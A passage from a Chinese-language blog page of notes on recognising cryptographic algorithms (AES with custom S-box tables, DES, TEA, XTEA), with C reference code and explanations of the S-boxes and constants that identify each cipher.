class="number">0xFA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xF0</span>,<span class="number">0xAD</span>,<span class="number">0xD4</span>,<span class="number">0xA2</span>,<span class="number">0xAF</span>,<span class="number">0x9C</span>,<span class="number">0xA4</span>,<span class="number">0x72</span>,<span class="number">0xC0</span>,<span class="number">0xB7</span>,<span class="number">0xFD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0xF7</span>,<span class="number">0xcC</span>,<span class="number">0x34</span>,<span class="number">0xA5</span>,<span class="number">0xE5</span>,<span class="number">0xF1</span>,<span class="number">0x71</span>,<span class="number">0xD8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xC7</span>,<span class="number">0x23</span>,<span class="number">0xC3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9A</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xE2</span>,<span class="number">0xEB</span>,<span class="number">0x27</span>,<span class="number">0xB2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0xA0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0xD6</span>,<span class="number">0xB3</span>,<span class="number">0x29</span>,<span class="number">0xE3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xD1</span>,<span class="number">0x00</span>,<span class="number">0xED</span>,<span class="number">0x20</span>,<span class="number">0xFC</span>,<span class="number">0xB1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0xCB</span>,<span class="number">0xBE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0xCF</span>,<span class="number">0xD0</span>,<span class="number">0xEF</span>,<span class="number">0xAA</span>,<span class="number">0xFB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xF9</span>,<span class="number">0x02</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0xA8</span>,<span class="number">0x51</span>,<span class="number">0xA3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0xF5</span>,<span class="number">0xBC</span>,<span class="number">0xB6</span>,<span class="number">0xDA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xFF</span>,<span class="number">0xF3</span>,<span class="number">0xD2</span>,<span class="number">0xCD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0xEC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xC4</span>,<span class="number">0xA7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0xDC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xEE</span>,<span class="number">0xB8</span>,<span class="number">0x14</span>,<span class="number">0xDE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0xDB</span>,<span class="number">0xE0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0xC2</span>,<span class="number">0xD3</span>,<span class="number">0xAC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xE4</span>,<span class="number">0x79</span>,<span class="number">0xE7</span>,<span class="number">0xC8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span class="number">0x8D</span>,<span class="number">0xD5</span>,<span class="number">0x4E</span>,<span class="number">0xA9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0xF4</span>,<span class="number">0xEA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0xAE</span>,<span class="number">0x08</span>,<span class="number">0xBA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0xA6</span>,<span class="number">0xB4</span>,<span class="number">0xC6</span>,<span class="number">0xE8</span>,<span class="number">0xDD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0xBD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0xB5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xF6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xB9</span>,<span class="number">0x86</span>,<span class="number">0xC1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0xE1</span>,<span class="number">0xF8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xD9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0xE9</span>,<span class="number">0xCE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xDF</span>,<span class="number">0x8C</span>,<span class="number">0xA1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0xBF</span>,<span class="number">0xE6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0xB0</span>,<span class="number">0x54</span>,<span class="number">0xBB</span>,<span class="number">0x16</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> RSBOX[]=&#123;<span class="number">0x48</span>,<span class="number">0x40</span>,<span class="number">0x58</span>,<span class="number">0xb5</span>,<span class="number">0x08</span>,<span class="number">0x24</span>,<span class="number">0x29</span>,<span class="number">0x76</span>,<span class="number">0xf4</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,<span class="number">0xdf</span>,<span class="number">0x91</span>,<span class="number">0x7e</span>,<span class="number">0x0d</span>,<span class="number">0x63</span>,<span class="number">0x01</span>,<span class="number">0x4d</span>,<span class="number">0x5b</span>,<span class="number">0x11</span>,<span class="number">0xe8</span>,<span class="number">0x4e</span>,<span class="number">0x7d</span>,<span class="number">0xea</span>,<span class="number">0x28</span>,<span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0x9c</span>,<span class="number">0xeb</span>,<span class="number">0x59</span>,<span class="number">0xfd</span>,<span class="number">0x03</span>,<span class="number">0xe7</span>,<span class="number">0xa1</span>,<span class="number">0xc5</span>,<span class="number">0xa8</span>,<span class="number">0x32</span>,<span class="number">0x8b</span>,<span class="number">0x99</span>,<span class="number">0x5d</span>,<span class="number">0xad</span>,<span class="number">0x9e</span>,<span class="number">0xf6</span>,<span class="number">0x14</span>,<span class="number">0x33</span>,<span class="number">0xb6</span>,<span class="number">0xbf</span>,<span class="number">0xc3</span>,<span class="number">0xf1</span>,<span class="number">0xd3</span>,<span class="number">0xee</span>,<span class="number">0xe5</span>,<span class="number">0xa6</span>,<span class="number">0x3e</span>,<span class="number">0x0f</span>,<span class="number">0x57</span>,<span class="number">0x1a</span>,<span class="number">0xa4</span>,<span class="number">0xb3</span>,<span class="number">0xce</span>,<span class="number">0x51</span>,<span class="number">0xc2</span>,<span class="number">0x1e</span>,<span class="number">0xe1</span>,<span class="number">0xd6</span>,<span class="number">0x8c</span>,<span class="number">0xdc</span>,<span class="number">0xf7</span>,<span class="number">0xe2</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1d</span>,<span class="number">0xa7</span>,<span class="number">0x27</span>,<span class="number">0x8d</span>,<span class="number">0xbc</span>,<span class="number">0x79</span>,<span class="number">0x74</span>,<span class="number">0xb8</span>,<span class="number">0xd0</span>,<span class="number">0xd4</span>,<span class="number">0x6c</span>,<span class="number">0x21</span>,<span class="number">0x53</span>,<span class="number">0xdb</span>,<span class="number">0x7a</span>,<span class="number">0x9d</span>,<span class="number">0x2f</span>,<span class="number">0x98</span>,<span class="number">0xda</span>,<span class="number">0x89</span>,<span class="number">0xb4</span>,<span class="number">0x75</span>,<span class="number">0x4f</span>,<span class="number">0x96</span>,<span class="number">0x2d</span>,<span class="number">0x0e</span>,<span class="number">0x52</span>,<span class="number">0xf0</span>,<span class="number">0x78</span>,<span class="number">0xa9</span>,<span class="number">0xa3</span>,<span class="number">0x26</span>,<span class="number">0xae</span>,<span class="number">0x5e</span>,<span class="number">0x36</span>,<span class="number">0x9a</span>,<span class="number">0x4b</span>,<span class="number">0x68</span>,<span class="number">0xa5</span>,<span class="number">0x60</span>,<span class="number">0x42</span>,<span class="number">0xe9</span>,<span class="number">0x73</span>,<span class="number">0x10</span>,<span class="number">0x25</span>,<span class="number">0xfb</span>,<span class="number">0x6a</span>,<span class="number">0xdd</span>,<span class="number">0x1b</span>,<span class="number">0xcd</span>,<span class="number">0xd5</span>,<span class="number">0x09</span>,<span class="number">0x82</span>,<span class="number">0xcf</span>,<span class="number">0x05</span>,<span class="number">0xa2</span>,<span class="number">0xac</span>,<span class="number">0xe3</span>,<span class="number">0xf8</span>,<span class="number">0x92</span>,<span class="number">0x0a</span>,<span class="number">0x93</span>,<span class="number">0xbb</span>,<span class="number">0x85</span>,<span class="number">0x04</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x17</span>,<span class="number">0xc6</span>,<span class="number">0xf5</span>,<span class="number">0x8f</span>,<span class="number">0x35</span>,<span class="number">0xaa</span>,<span class="number">0xca</span>,<span class="number">0x94</span>,<span class="number">0xb0</span>,<span class="number">0x18</span>,<span class="number">0xd9</span>,<span class="number">0x67</span>,<span class="number">0x3b</span>,<span class="number">0x69</span>,<span class="number">0xb2</span>,<span class="number">0xc8</span>,<span class="number">0xc4</span>,<span class="number">0x3f</span>,<span class="number">0xef</span>,<span class="number">0x45</span>,<span class="number">0x16</span>,<span class="number">0x2b</span>,<span class="number">0x43</span>,<span class="number">0x2c</span>,<span class="number">0xde</span>,<span class="number">0x4c</span>,<span class="number">0x07</span>,<span class="number">0xf2</span>,<span class="number">0x06</span>,<span class="number">0x20</span>,<span class="number">0xab</span>,<span class="number">0xd7</span>,<span class="number">0x62</span>,<span class="number">0x34</span>,<span class="number">0x5a</span>,<span class="number">0x44</span>,<span class="number">0x55</span>,<span class="number">0xb9</span>,<span class="number">0xd1</span>,<span class="number">0xcc</span>,<span class="number">0xc7</span>,<span class="number">0x7f</span>,<span class="number">0xaf</span>,<span class="number">0x54</span>,<span class="number">0x37</span>,<span class="number">0x9f</span>,<span class="number">0x1f</span>,<span class="number">0x0c</span>,<span class="number">0xc1</span>,<span class="number">0x80</span>,<span class="number">0x46</span>,<span class="number">0xba</span>,<span class="number">0xcb</span>,<span class="number">0xc9</span>,<span class="number">0x6f</span>,<span class="number">0x66</span>,<span class="number">0x97</span>,<span class="number">0x38</span>,<span class="number">0x31</span>,<span class="number">0x2e</span>,<span class="number">0x56</span>,<span class="number">0x39</span>,<span class="number">0x7c</span>,<span class="number">0x15</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x83</span>,<span class="number">0x84</span>,<span class="number">0x90</span>,<span class="number">0x70</span>,<span class="number">0x6b</span>,<span class="number">0xb7</span>,<span class="number">0x8e</span>,<span class="number">0xd2</span>,<span class="number">0x5c</span>,<span class="number">0xf3</span>,<span class="number">0xfa</span>,<span class="number">0x2a</span>,<span class="number">0xbd</span>,<span class="number">0x6e</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x1c</span>,<span class="number">0x61</span>,<span class="number">0x47</span>,<span class="number">0xa0</span>,<span class="number">0x49</span>,<span class="number">0x65</span>,<span class="number">0xbe</span>,<span class="number">0x95</span>,<span class="number">0x77</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x3c</span>,<span class="number">0xfe</span>,<span class="number">0x6d</span>,<span class="number">0x41</span>,<span class="number">0x50</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0x87</span>,<span class="number">0x0b</span>,<span class="number">0x30</span>,<span class="number">0x8a</span>,<span class="number">0xc0</span>,<span class="number">0x02</span>,<span class="number">0x4a</span>,<span class="number">0x23</span>,<span class="number">0xe0</span>,<span class="number">0xe4</span>,<span class="number">0x9b</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x7b</span>,<span class="number">0x81</span>,<span class="number">0x13</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> MIX_COL_MAT[] = &#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> RE_MIX_COL_MAT[] = &#123;<span class="number">0xe</span>,<span class="number">0x9</span>,<span class="number">0xd</span>,<span class="number">0xb</span>,<span class="number">0xb</span>,<span class="number">0xe</span>,<span class="number">0x9</span>,<span class="number">0xd</span>,<span class="number">0xd</span>,<span class="number">0xb</span>,<span class="number">0xe</span>,<span class="number">0x9</span>,<span class="number">0x9</span>,<span class="number">0xd</span>,<span class="number">0xb</span>,<span class="number">0xe</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">subByte</span><span class="params">(<span class="keyword">uint8_t</span> *x,<span class="keyword">size_t</span> len,<span class="keyword">uint8_t</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        x[i]=s[x[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @function 行移位</span></span><br><span class="line"><span class="comment"> * 行移位实际上是字节级置换，所以转化成置换问题处理</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftRows</span><span class="params">(<span class="keyword">uint8_t</span> x[BLOCK_SIZE])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> tmp[BLOCK_SIZE];</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">uint8_t</span> tab[]=&#123;<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;BLOCK_SIZE;i++)&#123;</span><br><span class="line">        tmp[i]=x[tab[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(x,tmp,BLOCK_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addRoundKey</span><span class="params">(<span class="keyword">uint8_t</span> x[BLOCK_SIZE],<span class="keyword">uint8_t</span> rk[BLOCK_SIZE])</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;BLOCK_SIZE/<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            x[s2b(i,j)]^=rk[s2b(i,j)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mixCols</span><span class="params">(<span class="keyword">uint8_t</span> x[BLOCK_SIZE],<span class="keyword">uint8_t</span> <span class="keyword">const</span> mat[BLOCK_SIZE])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> tmp[BLOCK_SIZE];</span><br><span class="line">    <span class="keyword">uint8_t</span> sum;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> k=<span class="number">0</span>;k&lt;<span class="number">4</span>;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[s2b(i,k)]==<span class="number">2</span>&amp;&amp;(<span class="number">0x80</span>&amp;x[s2b(k,j)]))&#123;</span><br><span class="line">                    sum^=<span class="number">0x1b</span>^(x[s2b(k,j)]&lt;&lt;<span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    sum^=mat[s2b(i,k)]*x[s2b(k,j)];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp[s2b(i,j)]=sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(x,tmp,BLOCK_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint8_t</span> x[BLOCK_SIZE])</span></span>&#123;</span><br><span class="line">    addRoundKey(x,(<span class="keyword">uint8_t</span>*)k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        shiftRows(x);</span><br><span class="line">        mixCols(x,MIX_COL_MAT);</span><br><span class="line">        addRoundKey(x,(<span class="keyword">uint8_t</span>*)k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uint8_t</span> key[<span class="number">16</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *bk = (<span class="keyword">uint8_t</span>*)k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            bk[i*<span class="number">4</span>+j]=key[s2b(i,j)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> g;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">4</span>;i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(i&amp;<span class="number">3</span>))&#123;</span><br><span class="line">            g = ROL32(k[i<span class="number">-1</span>],<span class="number">8</span>);</span><br><span class="line">            subByte((<span class="keyword">uint8_t</span>*)&amp;g,<span class="number">4</span>,SBOX);</span><br><span class="line">            g^=RC[i/<span class="number">4</span>]&lt;&lt;<span class="number">24</span>;</span><br><span class="line">            k[i]=k[i<span class="number">-4</span>]^g;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            k[i]=k[i<span class="number">-4</span>]^k[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> key[] = <span class="string">&quot;deadbeef20201231&quot;</span>;</span><br><span class="line">    initKey((<span class="keyword">uint8_t</span>*)key);</span><br><span class="line">    printArray(<span class="string">&quot;key&quot;</span>,(<span class="keyword">uint8_t</span>*)k,<span class="number">44</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>S盒，密钥生成中的常量</p>
<p>参考资料：[AES–wikipedia](<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">高级加密标准 - 维基百科，自由的百科全书</a>)</p>
<h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>Fiestel网络</p>
<p>16个相同的过程，块长度为64位，分成两个32位的半块v1,v2</p>
<h4 id="总体过程："><a href="#总体过程：" class="headerlink" title="总体过程："></a>总体过程：</h4><ol>
<li><p>进行一次置换，称为IP</p>
</li>
<li><p>进行16轮如下操作</p>
<p>s1=v1^F(v2)</p>
<p>v1=v2</p>
<p>v2=s1</p>
<p>其中F为Fiestel函数，包含扩张，与密钥混合，S盒，置换操作</p>
</li>
<li><p>进行一次置换，成为FP，FP为IP的逆函数</p>
</li>
</ol>
<p>IP和FP是简化输入输出数据库的过程而被显式地包含在标准中</p>
<h4 id="Fiestel函数"><a href="#Fiestel函数" class="headerlink" title="Fiestel函数"></a>Fiestel函数</h4><ol>
<li><p>扩张</p>
<p>将32为半块扩展到48位，包含8个6位块，每块包含4位输出位，加上邻接块中紧邻的位</p>
</li>
<li><p>与密钥混合</p>
<p>用异或操作将扩张结果和子密钥混合，子密钥是通过密钥调度产生的</p>
</li>
<li><p>S盒</p>
<p>与子密钥混合后，分成6个8位的块，然后使用S盒置换处理</p>
</li>
<li><p>置换</p>
<p>32个输出位利用P置换进行重组</p>
</li>
</ol>
<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>S盒</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96">DES–wikipedia</a></p>
<h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p>可以加密两个无符号整数</p>
<p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也有部分变种，大多是变了delta，或者delta使用v0=(0-(-delta))</p>
<h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p>参考代码(来自wikipedia)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += 